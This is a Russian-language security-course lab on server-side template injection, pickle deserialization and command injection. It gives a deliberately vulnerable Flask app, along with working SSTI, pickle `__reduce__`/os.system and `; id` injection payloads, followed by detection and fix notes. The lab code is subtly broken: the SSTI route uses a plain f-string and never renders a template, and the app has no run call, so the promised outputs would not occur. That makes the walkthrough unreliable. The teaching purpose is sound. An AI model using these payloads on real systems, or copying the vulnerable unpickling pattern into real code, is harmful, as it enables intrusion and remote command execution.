# 8.4 — Десериализация, SSTI и RCE

> **M08 · Этап 1 · 5 ч · 🔴 · артефакт:** `labs/m08-web-api/l04-rce/`

## Цель

Понять, как «безобидный» парсинг шаблона или объекта превращается в выполнение команд, и собрать минимальные PoC.

## Результат

- SSTI в Jinja2 с выполнением команды.
- Pickle-десериализация с RCE.
- Понимание, чем опасен Java deserialization.

## Теория

- SSTI: пользовательский ввод попадает в шаблон, а не в данные. Jinja2 исполняет выражения.
- `{{7*7}}` → `49` — первый признак.
- Опасные объекты: `config`, `__class__`, `__mro__`, `__subclasses__`, `__globals__`.
- Pickle: при `loads()` вызывает `__reduce__`, что позволяет выполнить функцию.
- Java deserialization: gadget chains (ysoserial), `ObjectInputStream`.
- RCE через шаблон/десериализацию — это не «магия», а доверие к данным.

## Лаборатория

Создайте `vuln_app.py`:

```python
from flask import Flask, request
import pickle, base64, os

app = Flask(__name__)

@app.route("/ssti")
def ssti():
    name = request.args.get("name", "guest")
    return f"<h1>Hello {name}</h1>"

@app.route("/pickle", methods=["POST"])
def unpickle():
    return str(pickle.loads(base64.b64decode(request.data)))
```

Запуск:

```bash
pip install flask --break-system-packages
python vuln_app.py
```

### 1. SSTI

```bash
curl -s 'http://127.0.0.1:5000/ssti?name={{7*7}}'
```

Ожидаемо: `Hello 49`. Затем:

```bash
curl -s 'http://127.0.0.1:5000/ssti?name={{config}}'
curl -s 'http://127.0.0.1:5000/ssti?name={{cycler.__init__.__globals__.os.popen("id").read()}}'
```

Ожидаемо: конфиг и вывод `id`. Это RCE.

### 2. Pickle

Сгенерируйте payload:

```python
import pickle, base64, os

class E:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))

print(base64.b64encode(pickle.dumps(E())).decode())
```

Отправьте:

```bash
PAYLOAD='...'
curl -s -X POST --data-binary "$PAYLOAD" http://127.0.0.1:5000/pickle
cat /tmp/pwned
```

Ожидаемо: `/tmp/pwned` содержит `uid=...`. Десериализация выполнила команду.

### 3. Java (концепт)

Если есть Docker:

```bash
docker run -d -p 8080:8080 vulhub/struts2:s2-045
```

Изучите, как `Content-Type` с OGNL приводит к RCE. Не выходите за пределы контейнера.

### 4. Command injection (DVWA)

```
127.0.0.1; id
```

Ожидаемо: вывод `id`. Сравните с SSTI: там код исполняет шаблонизатор, здесь — shell.

## Атака и защита

- **Атака:** RCE на сервере → webshell → pivot.
- **Детект:** аномальные шаблонные выражения, `pickle` в пользовательском вводе, `os.system`, подозрительные дочерние процессы.
- **Фикс:** не рендерить пользовательский ввод как шаблон, sandbox, JSON вместо pickle, подпись/шифрование, RCE-защита на уровне WAF и рантайма.

## Самопроверка

- [ ] Почему `{{7*7}}` — хороший первый тест?
- [ ] Чем `__reduce__` опасен при `pickle.loads`?
- [ ] Почему sandbox Jinja2 не всегда спасает?
- [ ] Как отличить SSTI от command injection по поведению?

## Дальше

[8.5 — JWT, OAuth, сессии](l05-auth-jwt-oauth.md)
